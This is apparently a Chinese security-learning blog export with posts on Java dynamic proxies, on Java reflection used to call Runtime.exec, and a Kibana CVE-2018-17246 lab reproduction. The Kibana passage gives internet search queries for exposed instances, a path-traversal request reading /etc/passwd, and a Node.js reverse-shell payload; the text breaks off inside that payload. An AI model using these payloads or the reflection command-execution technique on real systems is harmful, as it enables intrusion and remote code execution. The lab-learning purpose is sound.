<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>在内存中生成代理对象的技术。整个代理过程在内存中进行，不需要手动写代理类的代码，也不存在代理类的编译过程，而是直接在Java运行期，凭空在JVM中生成一个代理类对象，供我们使用。</p>
<h4 id="基于JDK的动态代理"><a href="#基于JDK的动态代理" class="headerlink" title="基于JDK的动态代理"></a>基于JDK的动态代理</h4><p>JDK自带的动态代理技术，需要使用静态方法来创建代理对象，要求目标类必须实现接口。</p>
<p><strong>Developer.java</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Developer &#123;</span><br><span class="line">        void code();//会写代码</span><br><span class="line">        void debug();//会调试程序</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>GoodDeveloper.java</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GoodDeveloper implements Developer &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    public  GoodDeveloper(String name)</span><br><span class="line">    &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void code() &#123;</span><br><span class="line">        System.out.println(this.name+&quot; is coding Gooddeveloper!!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public void debug() &#123;</span><br><span class="line">        System.out.println(this.name+&quot; is debugging Gooddeveloper!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>ProxyTest.java</strong></p>
<p>动态代理的例子采用了lambda表达式，主要代码是对InvocationHandler的实现。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">public class ProxyTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Throwable &#123;</span><br><span class="line">        Developer developer = new GoodDeveloper(&quot;YZT&quot;);</span><br><span class="line">        //新建Developer类型，GoodDeveloper对象</span><br><span class="line">        Developer developerproxy = (Developer) Proxy.newProxyInstance(developer.getClass().getClassLoader(),developer.getClass().getInterfaces(),(proxy, method, args1) -&gt;&#123;</span><br><span class="line">            if(method.getName().equals(&quot;code&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(&quot;YZT is praying for the code!!!&quot;);</span><br><span class="line">                return method.invoke(developer,args1);</span><br><span class="line"></span><br><span class="line">            &#125; else if (method.getName().equals(&quot;debug&quot;)) &#123;</span><br><span class="line">                System.out.println(&quot;YZT&#x27;s code is bug-free and does not require debugging!!!&quot;);</span><br><span class="line">                return method.invoke(developer,args1);</span><br><span class="line">            &#125;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;);</span><br><span class="line">        //labmba匿名函数，新建Developer类型接口，定义方法体输入结果对code()和debug()函数进行动态设置</span><br><span class="line">        developerproxy.code();</span><br><span class="line">        developerproxy.debug();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210103459006.png" class title="image-20220210103459006">



<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>developerproxy的类型是Developer接口，而不是一个实现类。developer是基于Developer接口和GoodDeveloper的实现类加载代理出来的对象，并不属于任何一个实现类。</p>
<p>我们来看下<strong>ProxyTest.java</strong>中的newProxyInstance()接口:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.Proxy @NotNull </span><br><span class="line">public static Object newProxyInstance(ClassLoader loader,@NotNull Class&lt;?&gt;[] interfaces,             @NotNull reflect.InvocationHandler h)</span><br><span class="line">throws IllegalArgumentException</span><br></pre></td></tr></table></figure>

<p>接口中包括三个参数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader loader：固定写法，执行目标类对象的类加载器即可，用于加载目标类及其接口的代码</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt;[] interfaces：固定写法，指定目标类对象的所有接口的Class对象的数组，通常使用目标类的Class对象调用getInterfaces()即可得到</span><br><span class="line"></span><br><span class="line">InvocationHandler h：这个参数是一个接口，主要关注它里面唯一一个方法，invoke方法。它会在代理对象调用方法时执行。也就是说，在代理类对象中调用任何方法，都会执行到invoke()方法。所以在该方法中完成对增强或扩展代码逻辑</span><br></pre></td></tr></table></figure>

<p>loader和interfaces决定这个类到底是个怎么样的类。而h是InvocationHandler，决定这个代理类到底是多了什么功能。所以动态代理的内容重点就是这个InvocationHandler。</p>
<h4 id="基于CGLIB-父类-的动态代理"><a href="#基于CGLIB-父类-的动态代理" class="headerlink" title="基于CGLIB(父类)的动态代理"></a>基于CGLIB(父类)的动态代理</h4><p>该方式是通过一个静态方法来创建代理对象，不要求目标类实现接口，但是对于目标类不能使用final进行修饰变量，基于目标类生成一个子类作为代理类，所以必须被继承。</p>
<p>首先在pom.xml文件中添加CGLIB依赖并下载 相关依赖文件资源。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;cglib&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;cglib&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.3.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<p><strong>Cglibtest.java</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ublic class Cglibtest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建一个目标类对象，也就是顾客对象</span><br><span class="line">        Developer developer = new Developer(&quot;YZT&quot;);</span><br><span class="line">        // 使用CGLIB创建代理类对象</span><br><span class="line">        Developer proxy = (Developer) Enhancer.create(developer.getClass(), new MethodInterceptor() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Object intercept(Object proxy, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable &#123;</span><br><span class="line">                if(&quot;code&quot;.equals(method.getName()))&#123;</span><br><span class="line">                    System.out.println(&quot;YZT is praying for the code!!!&quot;);</span><br><span class="line">                    return method.invoke(developer, args);</span><br><span class="line">                &#125;else if (&quot;debug&quot;.equals(method.getName()))&#123;</span><br><span class="line">                    System.out.println(&quot;YZT&#x27;s code is bug-free and does not require debugging!!!&quot;);</span><br><span class="line">                    return method.invoke(developer, args);</span><br><span class="line">                &#125;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        proxy.code();</span><br><span class="line">        proxy.debug();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Enhancer.create(Class type, Callback callback)</span><br></pre></td></tr></table></figure>

<p>参数列表</p>
<p><strong>Class type</strong>：指定目标类Class对象，也就是目标类类型</p>
<p><strong>Callback callback</strong>：Callback是一个接口，该接口只是一个名称定义接口，并不包含方法的声明，所以使用时通常使用它的一个子接口<code>MethodInterceptor</code>，<code>MethodInterceptor</code>接口中只有一个方法：<code>intercept</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Object <span class="title">intercept</span><span class="params">(Object proxy, Method method, Object[] objects, MethodProxy methodProxy)</span></span></span><br></pre></td></tr></table></figure>

<p><strong>proxy</strong>：代理类对象</p>
<p><strong>method</strong>：对应的是出发intercept执行的方法的Method对象</p>
<p><strong>args</strong>：代理对象调用方法时，传递的实际参数</p>
<p>前三个参数与基于JDK的参数一致</p>
<p><strong>methodProxy</strong>：方法的代理对象，一般也不作处理，可以暂时忽略</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Proxy角色在执行代理业务的时候，无非是在调用真正业务之前或者之后做一些“额外”业务。 </p>
<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210111635827.png" class title="image-20220210111635827">

<p>代理类处理的逻辑很简单，在调用某个方法前及方法后做一些额外的业务。换一种思路就是，在触发（invoke）真实角色的方法之前或者之后做一些额外的业务。为了构造出具有通用、简单的代理类，可以将所有的触发真实角色动作交给一个触发的管理器。这种管理器就是InvocationHandler。</p>
<img src="/2022/02/08/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210111716233.png" class title="image-20220210111716233">



<p>在这种模式之中，代理Proxy和RealSubject需要实现相同的功能（函数方法）。</p>
<p>面向对象的编程之中，想要约定Proxy和RealSubject实现相同的功能（函数方法）有两种方式</p>
<p>a、定义一个功能接口，Proxy 和RealSubject都实现这个接口。</p>
<p>b、通过继承，Proxy继承自RealSubject，这样Proxy则拥有了RealSubject的功能，</p>
<p>JDK中提供的创建动态代理的机制采用a思路；而cglib采用b思路（spring两者都使用了）。 </p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-代码审计 -JAVA基础</tag>
      </tags>
  </entry>
  <entry>
    <title>java反射机制</title>
    <url>/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h1><p>本篇文章记录java的反射机制，虽然现在还不知道对渗透安全来说有什么好处，管他的，就是学@@</p>
<h2 id="什么是反射"><a href="#什么是反射" class="headerlink" title="什么是反射"></a>什么是反射</h2><blockquote>
<p>反射这个词啊，就是事物对外部动作刺激作出的相应反馈。今天学习的是java反射，那这又是什么东东呢？跟着小透来领略java带来的震撼和有趣吧！</p>
</blockquote>
<p>Java反射机制就是在程序运行状态中，动态调用任意一个类及其该类的所有属性和方法。(说实话，我TM看到这个解释的时候，一脸？？？)</p>
<p>下面我们将反射机制和直接类对象初始化作一个对比:</p>
<p>下面是自己写的helloworld类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.fanseTest;</span><br><span class="line"></span><br><span class="line">public class helloworld</span><br><span class="line">&#123;</span><br><span class="line">       public void hello(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(str.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>直接类对象实例化</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      helloworld test = <span class="keyword">new</span> helloworld();</span><br><span class="line">      test.hello(<span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211203210538333.png" class title="image-20211203210538333">



<ul>
<li>使用反射机制调用实例化</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fanse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        Class test = Class.forName(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        Method test1 = test.getMethod(<span class="string">&quot;hello&quot;</span>, String.class);</span><br><span class="line">        Constructor constructor = test.getConstructor();</span><br><span class="line">        Object test2 = constructor.newInstance();</span><br><span class="line">        test1.invoke(test2, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211203212216759.png" class title="image-20211203212216759">



<p>我们可以从上面两个的对比来看，第一种是在运行前将类实例化成对象并调用方法赋值，第二种反射机制是在运行时动态调用方法和属性赋值。</p>
<h2 id="反射的利弊"><a href="#反射的利弊" class="headerlink" title="反射的利弊"></a>反射的利弊</h2><p>Java反射机制(Reflection)是java非常重要的动态特性，我们不仅可以通过反射获取到任何类的方法(Methods)，成员变量(Fields)，构造方法(Constructors)等信息，还能动态创建任何类实例，</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul>
<li><p>可扩展性</p>
<p>应用程序可以利用全限定名创建可扩展对象的实例，来使用来自外部的用户自定义类。</p>
</li>
<li><p>类浏览器和可视化开发环境</p>
<p>一个类浏览器需要可以枚举类的成员。可视化开发环境（如 IDE）可以从利用反射中可用的类型信息中受益，以帮助程序员编写正确的代码。</p>
</li>
<li><p>调试器和测试工具</p>
<p>调试器需要能够检查一个类里的私有成员。测试工具可以利用反射来自动地调用类里定义的可被发现的 API 定义，以确保一组测试中有较高的代码覆盖率。</p>
</li>
</ul>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul>
<li><p>性能开辟</p>
<p>反射涉及了动态类型的解析，所以 JVM 无法对这些代码进行优化。因此，反射操作的效率要比那些非反射操作低得多。我们应该避免在经常被执行的代码或对性能要求很高的程序中使用反射。</p>
</li>
<li><p>安全限制</p>
<p>使用反射技术要求程序必须在一个没有安全限制的环境中运行。如果一个程序必须在有安全限制的环境中运行，如 Applet。</p>
</li>
<li><p>内部暴露</p>
<p>由于反射允许代码执行一些在正常情况下不被允许的操作（比如访问私有的属性和方法），所以使用反射可能会导致意料之外的副作用，这可能导致代码功能失调并破坏可移植性。反射代码破坏了抽象性，因此当平台发生改变的时候，代码的行为就有可能也随着变化。</p>
</li>
</ul>
<h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><p>我们可以从上面的反射代码中观察到，第一句代码的操作是获取类Class对象，所以这里简单记录下获取Class对象发方法:</p>
<ul>
<li><p>类名.class.</p>
<p>如:com.fanseTest.helloworld.class</p>
</li>
<li><p>Class.formName(“类名”).</p>
<p>如:Class.forName(“com.fanseTest.helloworld”)</p>
</li>
<li><p>对象名.getClass().</p>
<p>如:helloworld test &#x3D; new helloworld();        hello.getClass()</p>
</li>
<li><p>classloader.loadClass(“类名”)如:ClassLoader.getSystemClassLoader().loadClass(“com.fanseTest.helloworld”)</p>
</li>
</ul>
<p>如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">getClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String str = <span class="string">&quot;com.fanseTest.helloworld&quot;</span>;</span><br><span class="line">        Class test =  helloworld.class;</span><br><span class="line">        Class test1 = Class.forName(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        Class test2 = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        System.out.println(test.toString());</span><br><span class="line">        System.out.println(test1.toString());</span><br><span class="line">        System.out.println(test2.toString());</span><br><span class="line">        helloworld test3 = <span class="keyword">new</span> helloworld();</span><br><span class="line">        System.out.println(test3.getClass().toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211204195824874.png" class title="image-20211204195824874">



<p>值的注意的是，当我们获取数组类型的Class对象时，使用java类型描述符(类型描述符相关介绍参见<a href="https://www.haoyun.fit/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/">JAVA类型描述符 | 小透的少年江湖 (haoyun.fit)</a>)</p>
<p>举个栗子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; booleanArray = Class.forname(&quot;[Z&quot;);//获取布尔数组类对象</span><br><span class="line">Class&lt;?&gt; doubleArray = Class.forname(&quot;[D&quot;);//获取浮点数组类对象</span><br><span class="line">Class&lt;?&gt; byteArray = Class.forname(&quot;[B&quot;);//获取字节数组类对象</span><br><span class="line">Class&lt;?&gt; classArray = Class.forname(&quot;[Lclassname;&quot;);</span><br><span class="line">Class&lt;?&gt; cstringArray = Class.forname(&quot;[Ljava.lang.String;&quot;);//获取字符串数组类对象</span><br><span class="line">//[符号根据数组维度来添加</span><br></pre></td></tr></table></figure>

<p>注:</p>
<p>反射 调用内部类的时候需要使用$来代替.，如com.reflect.ReflectTest类中有一个叫做Hello的内部类，调用时将类名写成:com.reflect.ReflectTest$Hello。</p>
<h2 id="RunTime反射"><a href="#RunTime反射" class="headerlink" title="RunTime反射"></a>RunTime反射</h2><p>学习了什么是java反射机制和java反射机制的优缺点，我就有了一个疑问？对于渗透测试代码审计来说，java反射的作用是什么？或者说怎么利用这个机制进行测试。在一些反序列化漏洞执行系统命令时可以调用Runtime等类执行本地命令编写漏洞利用代码、代码审计、绕过RASP方法等，还有后面要学习的内存马等。</p>
<h3 id="本地命令执行"><a href="#本地命令执行" class="headerlink" title="本地命令执行"></a>本地命令执行</h3><p>执行本地命令:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zhixing</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  System.out.println(IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream(),<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反射Demo1:(注:记得添加org.apache.commons.io程序包)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zhixing</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;    <span class="comment">//System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;UTF-8&quot;));</span></span><br><span class="line">        <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">            Class runtimeClass1 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">            String cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">            Object runtimeInstance = constructor.newInstance();</span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">            Method runtimeMethod = runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">            Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">            InputStream in = process.getInputStream();</span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211207185314924.png" class title="image-20211207185314924">

<p>返回当前用户为:”desktop-3n366og\administrator”。</p>
<p>反射 Demo2:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;UTF-8&quot;));</span></span><br><span class="line">        <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">        Class runtimeClass1 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">        Object runtime = runtimeClass1.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(runtimeClass1);</span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">        Process process = (Process) runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(runtime,cmd);</span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">        InputStream in = process.getInputStream();</span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">        System.out.println(IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这两个代码都是反射调用Runtime类的exec()方法执行本地命令执行。但两者不同的是，Demo1获取Runtime类对象是通过构造器创建构造方法来获取，而Demo2是通过Runtime类的getRuntime()方法来获取。</p>
<h3 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h3><p>反射调用Runtime实现本地命令执行的流程如下:</p>
<ul>
<li>反射获取<code>Runtime</code>类对象(如<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>)</li>
<li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为<code>Runtime</code>的构造方法是<code>private</code>的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)</li>
<li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod(&quot;exec&quot;, String.class);</code>)</li>
<li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)</li>
</ul>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-Java基础 -java反射 -代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Kibana本地文件包含漏洞(CVE-2018-17246)</title>
    <url>/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/</url>
    <content><![CDATA[<h1 id="Kibana本地文件包含漏洞（CVE-2018-17246）"><a href="#Kibana本地文件包含漏洞（CVE-2018-17246）" class="headerlink" title="Kibana本地文件包含漏洞（CVE-2018-17246）"></a>Kibana本地文件包含漏洞（CVE-2018-17246）</h1><hr>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana 为 Elassticsearch 设计的一款开源的视图工具。其5.6.13到6.4.3之间的版本存在一处文件包含漏洞，通过这个漏洞攻击者可以包含任意服务器上的文件。此时，如果攻击者可以上传一个文件到服务器任意位置，即可执行代码。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ElasticSearch Kibana &lt; 6.4.3</span><br><span class="line">ElasticSearch Kibana &lt; 5.6.13</span><br></pre></td></tr></table></figure>



<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>



<p>Fofa:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用Vulhub集成漏洞环境进行搭建，命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/kibana/CVE-2018-17246</span><br><span class="line"> </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>



<p>kibana默认端口为5601,环境搭建成功后访问Kibana默认首页。</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125113942130.png" class title="image-20211125113942130">



<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>这里通过设置apis参数为需要包含的文件，这里设置为&#x2F;etc&#x2F;passwd文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>



<p>可以看到服务器响应500</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125134712598.png" class title="image-20211125134712598">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose logs</span><br></pre></td></tr></table></figure>

<p>查看kibana的日志，可以看到&#x2F;etc&#x2F;passwd文件已经被包含</p>
<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125135321214.png" class title="image-20211125135321214">



<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们写个反弹shell的js语句，将其放到kibana的docker镜像中</p>
<p>js代码如下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/bash&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">12345</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span 